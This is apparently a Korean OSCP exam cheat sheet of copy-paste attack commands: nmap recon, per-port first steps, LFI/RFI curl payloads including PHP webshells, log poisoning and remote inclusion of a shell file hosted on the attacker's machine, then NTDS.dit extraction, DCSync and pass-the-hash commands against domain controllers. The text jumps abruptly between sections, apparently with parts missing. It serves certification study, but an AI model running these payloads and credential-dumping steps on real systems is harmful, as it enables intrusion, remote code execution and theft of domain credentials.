# ★ OSCP 통합 마스터 치트시트

> 흩어진 17개 치트시트를 시험 흐름 순서로 종합·중복제거한 단일 레퍼런스. 원본은 각 파일에 그대로 있음.
> 변수: `T`=타깃 IP, `IP`=tun0(내 Kali) IP, `DC` `DOMAIN` `USER` `PASS` `NThash`
> ⚠️ 시험 금지: sqlmap·commix·자동익스, 대량스캐너(Nessus/Nuclei), **Responder 포이즈닝**, MSF 모듈/Meterpreter는 **1대만**. msfvenom·수동익스·searchsploit은 전부 OK.


## 0. 사고방식 (막히면 제일 먼저 이거)

- **목표를 좁혀라:** "셸"이 아니라 → 단일=**취약한 문 하나** / AD=**첫 크리덴셜 하나**
- **넓은 질문 금지**("전체를 어떻게 뚫지") → **좁은 질문 반복**("이 포트가 뚫리나?")
- **막힘 = 기법 부족이 아니라 열거가 얕은 것.** "안 되네"가 아니라 "다음 무기".
- **두 반사:** ①버전 보이면 → `searchsploit` ②입력/기능 있으면 → 취약점 클래스 순회
- **셸 잡으면 `id`/`whoami` 먼저** — 이미 root/SYSTEM이면 끝(원샷 박스 많음)
- **새 크리덴셜은 무조건 모든 서비스/유저에 재투입**

## 1. 정찰 · 열거 `#정찰`

```bash
nmap -p- --min-rate 5000 -Pn T -oN all.txt        # 전체 TCP (먼저). ★-Pn 필수: 시험 브리핑 "ping 응답 안 하는 머신 있음"
nmap -sC -sV -p <열린포트> -Pn T -oN svc.txt        # 정밀
sudo nmap -sU --top-ports 100 T                   # UDP (SNMP/TFTP 놓치지 말 것)
```
> ⚠️ **`-Pn` 없이 스캔하면 살아있는 박스를 "down"으로 오판**한다(시험 브리핑에 ICMP 무응답 명시). 항상 `-Pn`.

**포트로 박스 유형 판단:** `88/389/445/5985`→AD(DC) / `8080·8000·고포트 http`→웹 / `445만+웹없음`→SMB 파기

| 포트 | 첫 수 |
|---|---|
| **80/443/8080 웹** | → 2번 (단일 foothold 70%) |
| **22 SSH** | 크리덴셜 필요(웹/파일서에서 획득) / 약한비번 / 유출 키 |
| **21 FTP** | `ftp T`(anonymous) → 웹루트 업로드/파일 읽기 |
| **139/445 SMB** | `enum4linux-ng -A T` / `smbmap -H T -u anonymous -R` / `nmap -p445 --script smb-vuln* T`(MS17-010) |
| **389 LDAP** | `ldapsearch -x -H ldap://T -b "dc=x,dc=y"` (익명 바인드) |
| **161/udp SNMP** | `snmpwalk -v2c -c public T` / `snmp-check T` (유저·프로세스·SW 분류) |
| **1433 MSSQL/3306 MySQL/6379 Redis** | 기본·무인증 접속 → 크리덴셜/RCE |
| **3389 RDP / 5985 WinRM** | 크리덴셜 확보 후 xfreerdp/evil-winrm |
| **낯선 고포트** | 배너 뽑아 **그대로 검색** + `searchsploit` (예: 4505/4506 → SaltStack) |

## 2. 웹 공격 (입력/파라미터 보면 순회) `#웹`

### LFI/RFI (`?file= ?page= ?include= ?path=`) — 복붙용 curl
```bash
curl "http://T/index.php?file=/etc/passwd"                                             # LFI 되나(에러 읽기)
curl "http://T/index.php?file=php://filter/convert.base64-encode/resource=index.php" | base64 -d   # 소스(1순위)
curl "http://T/index.php?file=../../../../../../etc/passwd"                            # traversal
curl "http://T/index.php?file=data://text/plain,%3C%3Fphp%20echo%20'PWN123'%3B%3F%3E" # data:// 마커(url인코딩)
curl "http://T/index.php?file=php://input" --data "<?php system('id');?>"              # php://input RCE
curl "http://T/index.php?file=expect://id"                                            # expect
# 로그 포이즈닝: UA에 <?php ?> 심고 로그 include
curl "http://T/" -A "<?php system(\$_GET['c']);?>"; curl "http://T/index.php?file=/var/log/apache2/access.log&c=id"
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]);?>'            # 필터체인 RCE(체인을 ?file=에)
# RFI: Kali에서 python3 -m http.server 80 ; shell.txt = <?php system($_GET['c']);?>
curl "http://T/index.php?file=http://IP/shell.txt&c=id"
```
> 습관 2개: ①RCE 테스트는 **마커(PWN123)**로 "실행 vs 글자" 구분 ②**에러 메시지가 설정을 알려줌**(`URL file-access is disabled`=allow_url_include Off, `failed to open .../x.php`=확장자 append)

```bash
#   set context persistent nowriters
#   add volume c: alias x
#   create
#   expose %x% z:
diskshadow /s ds.txt
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
reg save hklm\system C:\temp\system.hive
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL     # Kali에서 덤프
# ── DCSync (복제권한 있을 때) ──
impacket-secretsdump -just-dc DOMAIN/USER:PASS@DC
impacket-secretsdump -just-dc-user krbtgt DOMAIN/USER@DC -hashes :NThash
# ── PtH / PtT / OverPtH ──
evil-winrm -i DC -u Administrator -H <NThash>
impacket-psexec -hashes :NThash DOMAIN/Administrator@DC
impacket-getTGT DOMAIN/USER -hashes :NThash -dc-ip DC ; export KRB5CCNAME=USER.ccache ; impacket-psexec -k -no-pass target.DOMAIN
nxc smb <SUBNET> -u USER -H <NThash> --continue-on-success        # 어디서 admin인지
```

### ★Double-Hop (WinRM 함정)

```powershell
# 증상: evil-winrm 셸에서 DC/공유 인증 시 "Access Denied"(자격증명은 맞음)

# 또는 Kali에서 -k/PtH로 직접 붙기 (evil-winrm 안 거치고)
```
